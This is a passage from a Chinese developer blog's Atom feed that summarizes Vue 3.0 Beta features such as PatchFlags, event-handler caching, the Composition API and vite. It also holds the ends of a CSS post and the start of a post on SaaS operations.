src="http://upload-images.jianshu.io/upload_images/13133049-0b1b797b8f9d40aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="text-decoration-style"></p><p>可以看到，线好粗好不协调，而且字符和装饰线发生重叠的时候，装饰线直接消失了，结果波浪线变成了一截一截的，还需要使用text-decoration-skip进行额外控制。因此，实际开发，不建议在实际项目中使用。</p><p>而且你无法预知每个波浪线重复片段的宽度，想要无限运动理论上就不太可行。</p><p>因此，文字或者图形的波浪线动画效果不能使用text-decoration的波浪线。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.imooc.com/article/286988&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/u
      
    
    </summary>
    
      <category term="CSS" scheme="https://zhanghao-web.github.io/categories/CSS/"/>
    
    
      <category term="CSS" scheme="https://zhanghao-web.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>尤雨溪在Vue3.0 Beta直播里聊到了这些…</title>
    <link href="https://zhanghao-web.github.io/2020/04/22/Vue/%E5%B0%A4%E9%9B%A8%E6%BA%AA%E5%9C%A8Vue3-0-Beta%E7%9B%B4%E6%92%AD%E9%87%8C%E8%81%8A%E5%88%B0%E4%BA%86%E8%BF%99%E4%BA%9B%E2%80%A6/"/>
    <id>https://zhanghao-web.github.io/2020/04/22/Vue/尤雨溪在Vue3-0-Beta直播里聊到了这些…/</id>
    <published>2020-04-22T14:07:49.000Z</published>
    <updated>2020-04-23T05:00:51.297Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5e9f6b3251882573a855cd52?utm_source=gold_browser_extension#heading-15" target="_blank" rel="noopener">原文地址(https://juejin.im/post/5e9f6b3251882573a855cd52?utm_source=gold_browser_extension#heading-15)</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>4月21日晚，Vue作者尤雨溪在哔哩哔哩直播分享了Vue.js 3.0 Beta最新进展。 以下是直播内容整理</p><h2 id="全新文档RFCs"><a href="#全新文档RFCs" class="headerlink" title="全新文档RFCs"></a>全新文档RFCs</h2><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719da838e76e8c7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="全新文档RFCs"></p><p><code>Vue.js 3.0 Beta</code>发布后的工作重点是保证稳定性和推进各类库集成</p><p>所有的进度和文档都将在全新<code>RFCs</code>文档可以看到。</p><h2 id="六大亮点"><a href="#六大亮点" class="headerlink" title="六大亮点"></a>六大亮点</h2><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719daca80f3b7c2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="六大亮点"></p><blockquote><ul><li>Performance：性能更比Vue 2.0强。</li><li>Tree shaking support：可以将无用模块“剪辑”，仅打包需要的。</li><li>Composition API：组合API</li><li>Fragment, Teleport, Suspense：“碎片”，Teleport即Protal传送门，“悬念”</li><li>Better TypeScript support：更优秀的Ts支持</li><li>Custom Renderer API：暴露了自定义渲染API</li></ul></blockquote><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/21/1719d6747e723d03?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Performance"></p><ul><li><ol><li>重写了虚拟Dom的实现（且保证了兼容性，脱离模版的渲染需求旺盛）。</li></ol></li><li><ol start="2"><li>编译模板的优化。</li></ol></li><li><ol start="3"><li>更高效的组件初始化。</li></ol></li><li><ol start="4"><li>update性能提高1.3~2倍。</li></ol></li><li><ol start="5"><li>SSR速度提高了2~3倍。</li></ol></li></ul><p>下面是各项性能对比</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719db04999e3890?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="性能对比"></p><h4 id="要点1：编译模板的优化"><a href="#要点1：编译模板的优化" class="headerlink" title="要点1：编译模板的优化"></a>要点1：编译模板的优化</h4><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e59cd0f2b668?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="编译模板的优化"></p><p>假设要编译以下代码</p><pre><code class="js">&lt;div&gt;  &lt;span/&gt;  &lt;span&gt;{{ msg }}&lt;/span&gt;&lt;/div&gt;</code></pre><pre><code class="js">import { createVNode as _createVNode, toDisplayString as _toDisplayString, openBlock as _openBlock, createBlock as _createBlock } from &quot;vue&quot;export function render(_ctx, _cache) {  return (_openBlock(), _createBlock(&quot;div&quot;, null, [    _createVNode(&quot;span&quot;, null, &quot;static&quot;),    _createVNode(&quot;span&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)  ]))}// Check the console for the AST</code></pre><p>注意看第二个<code>_createVNode</code>结尾的“1”：</p><p>Vue在运行时会生成number（大于0）值的<code>PatchFlag</code>，用作标记。</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e69419edbc4d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="标记"></p><p>仅带有<code>PatchFlag</code>标记的节点会被真正追踪，且无论层级嵌套多深，它的动态节点都直接与<code>Block</code>根节点绑定，无需再去遍历静态节点</p><p>再看以下例子：</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e6d7d3efe7f1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="例子2"></p><pre><code class="js">&lt;div&gt;  &lt;span&gt;static&lt;/span&gt;  &lt;span :id=&quot;hello&quot; class=&quot;bar&quot;&gt;{{ msg }}   &lt;/span&gt;&lt;/div&gt;</code></pre><pre><code class="js">import { createVNode as _createVNode, toDisplayString as _toDisplayString, openBlock as _openBlock, createBlock as _createBlock } from &quot;vue&quot;export function render(_ctx, _cache) {  return (_openBlock(), _createBlock(&quot;div&quot;, null, [    _createVNode(&quot;span&quot;, null, &quot;static&quot;),    _createVNode(&quot;span&quot;, {      id: _ctx.hello,      class: &quot;bar&quot;    }, _toDisplayString(_ctx.msg), 9 /* TEXT, PROPS */, [&quot;id&quot;])  ]))}</code></pre><a id="more"></a><p><code>PatchFlag</code> 变成了<code>9 /* TEXT, PROPS */, [&quot;id&quot;]</code><br>它会告知我们不光有TEXT变化，还有PROPS变化（id）<br>这样既跳出了<code>virtual dom</code>性能的瓶颈，又保留了可以手写<code>render</code>的灵活性。<br>等于是：既有react的灵活性，又有基于模板的性能保证。</p><h4 id="要点2-事件监听缓存：cacheHandlers"><a href="#要点2-事件监听缓存：cacheHandlers" class="headerlink" title="要点2: 事件监听缓存：cacheHandlers"></a>要点2: 事件监听缓存：cacheHandlers</h4><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e775146d5a84?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="cacheHandlers"></p><p>假设我们要绑定一个事件：</p><pre><code class="html">&lt;div&gt;  &lt;span @click=&quot;onClick&quot;&gt;    {{msg}}  &lt;/span&gt;&lt;/div&gt;</code></pre><p>关闭<code>cacheHandlers</code>后：</p><pre><code class="js">import { toDisplayString as _toDisplayString, createVNode as _createVNode, openBlock as _openBlock, createBlock as _createBlock } from &quot;vue&quot;export function render(_ctx, _cache) {  return (_openBlock(), _createBlock(&quot;div&quot;, null, [    _createVNode(&quot;span&quot;, { onClick: _ctx.onClick }, _toDisplayString(_ctx.msg), 9 /* TEXT, PROPS */, [&quot;onClick&quot;])  ]))}</code></pre><p><code>onClick</code>会被视为<code>PROPS</code>动态绑定，后续替换点击事件时需要进行更新。</p><p>开启<code>cacheHandlers</code>后：</p><pre><code class="js">import { toDisplayString as _toDisplayString, createVNode as _createVNode, openBlock as _openBlock, createBlock as _createBlock } from &quot;vue&quot;export function render(_ctx, _cache) {  return (_openBlock(), _createBlock(&quot;div&quot;, null, [    _createVNode(&quot;span&quot;, {      onClick: _cache[1] || (_cache[1] = $event =&gt; (_ctx.onClick($event)))    }, _toDisplayString(_ctx.msg), 1 /* TEXT */)  ]))}</code></pre><p><code>cache[1]</code>，会自动生成并缓存一个内联函数，“神奇”的变为一个静态节点。 Ps：相当于<code>React中useCallback</code>自动化。</p><p>并且支持手写内联函数：</p><pre><code class="html">&lt;div&gt;  &lt;span @click=&quot;()=&gt;foo()&quot;&gt;    {{msg}}  &lt;/span&gt;&lt;/div&gt;</code></pre><p>补充：<code>PatchFlags</code>枚举定义</p><p>而通过查询Ts枚举定义，我们可以看到分别定义了以下的追踪标记：</p><pre><code class="js">export const enum PatchFlags {  TEXT = 1,// 表示具有动态textContent的元素  CLASS = 1 &lt;&lt; 1,  // 表示有动态Class的元素  STYLE = 1 &lt;&lt; 2,  // 表示动态样式（静态如style=&quot;color: red&quot;，也会提升至动态）  PROPS = 1 &lt;&lt; 3,  // 表示具有非类/样式动态道具的元素。  FULL_PROPS = 1 &lt;&lt; 4,  // 表示带有动态键的道具的元素，与上面三种相斥  HYDRATE_EVENTS = 1 &lt;&lt; 5,  // 表示带有事件监听器的元素  STABLE_FRAGMENT = 1 &lt;&lt; 6,   // 表示其子顺序不变的片段（没懂）。   KEYED_FRAGMENT = 1 &lt;&lt; 7, // 表示带有键控或部分键控子元素的片段。  UNKEYED_FRAGMENT = 1 &lt;&lt; 8, // 表示带有无key绑定的片段  NEED_PATCH = 1 &lt;&lt; 9,   // 表示只需要非属性补丁的元素，例如ref或hooks  DYNAMIC_SLOTS = 1 &lt;&lt; 10,  // 表示具有动态插槽的元素  // 特殊 FLAGS -------------------------------------------------------------  HOISTED = -1,  // 特殊标志是负整数表示永远不会用作diff,只需检查 patchFlag === FLAG.  BAIL = -2 // 一个特殊的标志，指代差异算法（没懂）}</code></pre><p>感兴趣的可以看源码：<code>packages/shared/src/patchFlags.ts</code></p><h3 id="Tree-shaking-support"><a href="#Tree-shaking-support" class="headerlink" title="Tree shaking support"></a>Tree shaking support</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719db10e9e06382?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Tree shaking support"></p><ul><li>可以将无用模块“剪辑”，仅打包需要的（比如<code>v-model</code>,<code>&lt;transition&gt;</code>，用不到就不会打包）。</li><li>一个简单“HelloWorld”大小仅为：13.5kb11.75kb，仅Composition API。</li><li>包含运行时完整功能：22.5kb,拥有更多的功能，却比Vue 2更迷你。</li></ul><p>很多时候，我们并不需要 vue提供的所有功能，在 vue 2 并没有方式排除掉，但是 3.0 都可能做成了按需引入。</p><h3 id="Composition-API"><a href="#Composition-API" class="headerlink" title="Composition API"></a>Composition API</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719dc2469bd375c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Composition API"></p><p>与React Hooks 类似的东西，实现方式不同。</p><ul><li>可与现有的 Options API一起使用</li><li>灵活的逻辑组合与复用</li><li>vue 3的响应式模块可以和其他框架搭配使用</li></ul><p>混入<code>(mixin)</code> 将不再作为推荐使用， <code>Composition API</code>可以实现更灵活且无副作用的复用代码。</p><p>感兴趣的可以查看：<a href="https://composition-api.vuejs.org/#summary" target="_blank" rel="noopener">composition-api.vuejs.org/#summary</a></p><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719dc20717835c1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="omposition-api.vuejs.org"></p><p>Composition API包含了六个主要API</p><p><a href="https://composition-api.vuejs.org/api.html#setup" target="_blank" rel="noopener">composition-api.vuejs.org/api.html#setup</a></p><p>Ps：其它的均为常见的工具函数，可先忽略不看。</p><h3 id="Fragment"><a href="#Fragment" class="headerlink" title="Fragment"></a>Fragment</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719dcd5c5f2b631?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Fragment"></p><p>Fragment翻译为：“碎片”</p><ul><li>不再限于模板中的单个根节点</li><li>render 函数也可以返回数组了，类似实现了 React.Fragments 的功能 。</li><li>‘Just works’</li></ul><h4 id=""><a href="#" class="headerlink" title=""></a><Teleport></h4><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719dd2d18fe0d55?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Teleport"></p><ul><li>以前称为<code>&lt;Portal&gt;</code>，译作传送门。</li><li>更多细节将由@<code>Linusborg</code> 分享</li></ul><p><code>&lt;Teleport&gt;</code>原先是对标 <code>React Portal</code>（增加多个新功能，更强）</p><p>但因为Chrome有个提案，会增加一个名为<code>Portal</code>的原生<code>element</code>，为避免命名冲突，改为<code>Teleport</code></p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><Suspense></h4><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719ddbaf6d0f226?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Suspense"></p><p>Suspense翻译为：“悬念”</p><ul><li>可在嵌套层级中等待嵌套的异步依赖项</li><li>支持async setup()</li><li>支持异步组件</li></ul><p>虽然React 16引入了<code>Suspense</code>，但直至现在都不太能用。如何将其与异步数据结合，还没完整设计出来。<br>Vue 3 的<code>&lt;Suspense&gt;</code>更加轻量：<br><strong>仅5%应用能感知运行时的调度差异，综合考虑下，Vue3 的<code>&lt;Suspense&gt;</code> 没和React一样做运行调度处理</strong></p><h3 id="更好的TypeScript支持"><a href="#更好的TypeScript支持" class="headerlink" title="更好的TypeScript支持"></a>更好的TypeScript支持</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719de6ad581aa38?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="TypeScript"></p><ul><li>Vue 3是用TypeScript编写的库，可以享受到自动的类型定义提示</li><li>JavaScript和TypeScript中的API是相同的。事实上，代码也基本相同</li><li>支持TSX,class组件还会继续支持，但是需要引入<code>vue-class-component@next</code>，该模块目前还处在 alpha 阶段。</li></ul><p>还有<code>Vue 3 + TypeScript</code> 插件正在开发，有类型检查，自动补全等功能。目前进展可喜。</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719deb6563506b7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Vue 3 + TypeScript"></p><h3 id="Custom-Renderer-API：自定义渲染器API"><a href="#Custom-Renderer-API：自定义渲染器API" class="headerlink" title="Custom Renderer API：自定义渲染器API"></a>Custom Renderer API：自定义渲染器API</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719df0e878dbeb3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Custom Renderer API"></p><ul><li>正在进行NativeScript Vue集成</li><li>用户可以尝试WebGL自定义渲染器，与普通Vue应用程序一起使用（Vugel）。</li></ul><p>意味着以后可以通过 <code>vue</code>， <code>Dom</code> 编程的方式来进行 <code>webgl</code> 编程 。感兴趣可以看这里：<a href="https://vugel.planning.nl/#application" target="_blank" rel="noopener">Getting started vugel</a></p><h2 id="剩余工作"><a href="#剩余工作" class="headerlink" title="剩余工作"></a>剩余工作</h2><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719df667b34919f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="剩余工作"></p><h3 id="Docs-amp-Migration-Guides"><a href="#Docs-amp-Migration-Guides" class="headerlink" title="Docs &amp; Migration Guides"></a>Docs &amp; Migration Guides</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719df8c7c95f9b9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Docs &amp; Migration Guides"></p><ul><li>新的文档编写交由<code>@NataliaTepluhina, @sdras, @bencodezen &amp; @phanan</code> 负责</li><li><code>@sdras</code> 正在做自动升级迁移工具</li><li><code>@sodatea</code> 已经开始研究<code>CodeMods</code></li></ul><h3 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719dfcab0e73db6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Router"></p><ul><li>下一代 Router：<code>vue-router@next</code>已在alpha阶段，感谢<code>@posva</code></li></ul><p>有部分的<code>API</code>变动，可到<code>RFC</code>上看。</p><h3 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719dfed3afd961b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Vuex"></p><ul><li>下一代Vuex：，<code>vuex@next</code>（与Vue 3 compat相同的API），已在alpha阶段，感谢<code>@KiaKing</code>。</li><li>团队正在为下一次迭代试验Vuex API的简化</li></ul><p>目前以兼容Vue 3为主，基本上没有API变动，莫慌。</p><h3 id="CLI"><a href="#CLI" class="headerlink" title="CLI"></a>CLI</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e043616c018f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="CLI"></p><ul><li>CLI插件：<code>vue-cli-plugin-vue-next</code> by <code>@sodatea</code></li><li>（wip）CodeMods支持升级Vue 2应用</li></ul><h3 id="新工具：vite（法语-“快”）"><a href="#新工具：vite（法语-“快”）" class="headerlink" title="新工具：vite（法语 “快”）"></a>新工具：vite（法语 “快”）</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e0c133c3367f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="vite"></p><p>地址：<a href="https://github.com/vuejs/vite" target="_blank" rel="noopener">github.com/vuejs/vite</a></p><p>一个简易的http服务器，无需<code>webpack</code>编译打包，根据请求的Vue文件，直接发回渲染，且支持热更新（非常快）</p><h3 id="vue-test-utils"><a href="#vue-test-utils" class="headerlink" title="vue-test-utils"></a>vue-test-utils</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e0d602d57dc6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="vue-test-utils"></p><h3 id="DevTools"><a href="#DevTools" class="headerlink" title="DevTools"></a>DevTools</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e0d0e479ec8b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="devtools"></p><h3 id="IDE-Support-Vetur"><a href="#IDE-Support-Vetur" class="headerlink" title="IDE Support (Vetur)"></a>IDE Support (Vetur)</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e12c5bfa38e3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="IDE"></p><h3 id="Nuxt"><a href="#Nuxt" class="headerlink" title="Nuxt"></a>Nuxt</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e15306126103?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Nuxt"></p><h3 id="Vue-2-x还有2-7版本"><a href="#Vue-2-x还有2-7版本" class="headerlink" title="Vue 2.x还有2.7版本"></a>Vue 2.x还有2.7版本</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/22/1719e16b0eaabdd2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="Vue 2.x还有2.7版本"></p><ul><li>将有最后一个小版本（2.7）</li><li>从Vue 3向后移植兼容的改进(不损坏兼容性前提下)</li><li>加上在Vue 3中删除的功能的弃用警告</li><li>LTS1 18个月。</li></ul><p><strong>最后建议：Vue 3虽好，如果你的项目很稳定，且对新功能无过多的要求或者迁移成本过高，则不建议升级。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5e9f6b3251882573a855cd52?utm_source=gold_browser_extension#heading-15&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址(https://juejin.im/post/5e9f6b3251882573a855cd52?utm_source=gold_browser_extension#heading-15)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;4月21日晚，Vue作者尤雨溪在哔哩哔哩直播分享了Vue.js 3.0 Beta最新进展。 以下是直播内容整理&lt;/p&gt;
&lt;h2 id=&quot;全新文档RFCs&quot;&gt;&lt;a href=&quot;#全新文档RFCs&quot; class=&quot;headerlink&quot; title=&quot;全新文档RFCs&quot;&gt;&lt;/a&gt;全新文档RFCs&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/22/1719da838e76e8c7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;全新文档RFCs&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Vue.js 3.0 Beta&lt;/code&gt;发布后的工作重点是保证稳定性和推进各类库集成&lt;/p&gt;
&lt;p&gt;所有的进度和文档都将在全新&lt;code&gt;RFCs&lt;/code&gt;文档可以看到。&lt;/p&gt;
&lt;h2 id=&quot;六大亮点&quot;&gt;&lt;a href=&quot;#六大亮点&quot; class=&quot;headerlink&quot; title=&quot;六大亮点&quot;&gt;&lt;/a&gt;六大亮点&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/22/1719daca80f3b7c2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;六大亮点&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Performance：性能更比Vue 2.0强。&lt;/li&gt;
&lt;li&gt;Tree shaking support：可以将无用模块“剪辑”，仅打包需要的。&lt;/li&gt;
&lt;li&gt;Composition API：组合API&lt;/li&gt;
&lt;li&gt;Fragment, Teleport, Suspense：“碎片”，Teleport即Protal传送门，“悬念”&lt;/li&gt;
&lt;li&gt;Better TypeScript support：更优秀的Ts支持&lt;/li&gt;
&lt;li&gt;Custom Renderer API：暴露了自定义渲染API&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Performance&quot;&gt;&lt;a href=&quot;#Performance&quot; class=&quot;headerlink&quot; title=&quot;Performance&quot;&gt;&lt;/a&gt;Performance&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/21/1719d6747e723d03?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;Performance&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;ol&gt;
&lt;li&gt;重写了虚拟Dom的实现（且保证了兼容性，脱离模版的渲染需求旺盛）。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;编译模板的优化。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;更高效的组件初始化。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;update性能提高1.3~2倍。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;SSR速度提高了2~3倍。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是各项性能对比&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/22/1719db04999e3890?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;性能对比&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;要点1：编译模板的优化&quot;&gt;&lt;a href=&quot;#要点1：编译模板的优化&quot; class=&quot;headerlink&quot; title=&quot;要点1：编译模板的优化&quot;&gt;&lt;/a&gt;要点1：编译模板的优化&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/22/1719e59cd0f2b668?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;编译模板的优化&quot;&gt;&lt;/p&gt;
&lt;p&gt;假设要编译以下代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;span/&amp;gt;
  &amp;lt;span&amp;gt;{{ msg }}&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;import { createVNode as _createVNode, toDisplayString as _toDisplayString, openBlock as _openBlock, createBlock as _createBlock } from &amp;quot;vue&amp;quot;

export function render(_ctx, _cache) {
  return (_openBlock(), _createBlock(&amp;quot;div&amp;quot;, null, [
    _createVNode(&amp;quot;span&amp;quot;, null, &amp;quot;static&amp;quot;),
    _createVNode(&amp;quot;span&amp;quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)
  ]))
}

// Check the console for the AST
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意看第二个&lt;code&gt;_createVNode&lt;/code&gt;结尾的“1”：&lt;/p&gt;
&lt;p&gt;Vue在运行时会生成number（大于0）值的&lt;code&gt;PatchFlag&lt;/code&gt;，用作标记。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/22/1719e69419edbc4d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;标记&quot;&gt;&lt;/p&gt;
&lt;p&gt;仅带有&lt;code&gt;PatchFlag&lt;/code&gt;标记的节点会被真正追踪，且无论层级嵌套多深，它的动态节点都直接与&lt;code&gt;Block&lt;/code&gt;根节点绑定，无需再去遍历静态节点&lt;/p&gt;
&lt;p&gt;再看以下例子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/4/22/1719e6d7d3efe7f1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1&quot; alt=&quot;例子2&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;span&amp;gt;static&amp;lt;/span&amp;gt;
  &amp;lt;span :id=&amp;quot;hello&amp;quot; class=&amp;quot;bar&amp;quot;&amp;gt;{{ msg }}   &amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;import { createVNode as _createVNode, toDisplayString as _toDisplayString, openBlock as _openBlock, createBlock as _createBlock } from &amp;quot;vue&amp;quot;

export function render(_ctx, _cache) {
  return (_openBlock(), _createBlock(&amp;quot;div&amp;quot;, null, [
    _createVNode(&amp;quot;span&amp;quot;, null, &amp;quot;static&amp;quot;),
    _createVNode(&amp;quot;span&amp;quot;, {
      id: _ctx.hello,
      class: &amp;quot;bar&amp;quot;
    }, _toDisplayString(_ctx.msg), 9 /* TEXT, PROPS */, [&amp;quot;id&amp;quot;])
  ]))
}
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue3.x" scheme="https://zhanghao-web.github.io/tags/Vue3-x/"/>
    
  </entry>
  
  <entry>
    <title>关于SaaS产品的一些思考和总结</title>
    <link href="https://zhanghao-web.github.io/2020/04/20/%E6%9D%82%E6%96%87/%E5%85%B3%E4%BA%8ESaaS%E4%BA%A7%E5%93%81%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%E5%92%8C%E6%80%BB%E7%BB%93/"/>
    <id>https://zhanghao-web.github.io/2020/04/20/杂文/关于SaaS产品的一些思考和总结/</id>
    <published>2020-04-20T09:38:27.000Z</published>
    <updated>2020-04-20T12:30:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SaaS的收费模式"><a href="#SaaS的收费模式" class="headerlink" title="SaaS的收费模式"></a>SaaS的收费模式</h1><p>首年收取的是开户费(软件系统费和账号费等)，从第二年开始收取年费，Sass要提供持续的运营服务才能够持续收费</p><h1 id="SaaS的运营框架"><a href="#SaaS的运营框架" class="headerlink" title="SaaS的运营框架"></a>SaaS的运营框架</h1><h2 id="基础工作"><a href="#基础工作" class="headerlink" title="基础工作"></a>基础工作</h2><h3 id="弄懂产品"><a href="#弄懂产品" class="headerlink" title="弄懂产品"></a>弄懂产品</h3><p>了解产品，可不是注册一个账号，随便玩玩，然后提几个优化建议就完事了，这是敷衍。真正弄懂产品，可以从这4方面入手。</p><p>第一、了解产品相关的行业背景，如行业历史、现状、最新动态。了解产品涉及的基础知识，如技术原理，在行业的优势。</p><p>第二、阅读产品相关的材料，包括内部的文档、介绍、白皮书，外部的报道、技术分析等。</p><p>第三、经常和技术、产品、客服同学交流，了解内部人对产品的切身感受和想法。</p><p>第四、自己深度体验产品，多问几个为什么。为什么这个功能是这样设计的，在什么场景下为谁解决了什么问题？</p><h3 id="弄懂业务"><a href="#弄懂业务" class="headerlink" title="弄懂业务"></a>弄懂业务</h3><p>首先，要弄懂自己内部的业务。要把同事变成自己的助手，而不是阻力。一定要熟悉各部门的办事流程、各部门能支持的资源、老板能支持的资源，洞悉和掌握这些信息，有利于你开展工作，快速推进。</p><p>其次，要了解客户的业务。他们的业务是怎么运作的，每个人是如何分工配合的，遇到的问题是什么。弄懂客户的业务，才能更好的匹配客户需求，不然永远是门外汉。</p><h3 id="弄懂用户路径"><a href="#弄懂用户路径" class="headerlink" title="弄懂用户路径"></a>弄懂用户路径</h3><p>用户是怎么认识你，为什么选择了你，最后又是怎么流失的？如果你能弄懂用户路径，那么就知道每个环节应该做什么，张弛有度，整体的运营工作开展就会很顺利。这一点非常重要，很多人就是没搞懂用户路径，不知道工作从哪着手，想到一点就做一点，完全没有章法，工作自然难出成绩。</p><h1 id="SaaS的核心组件"><a 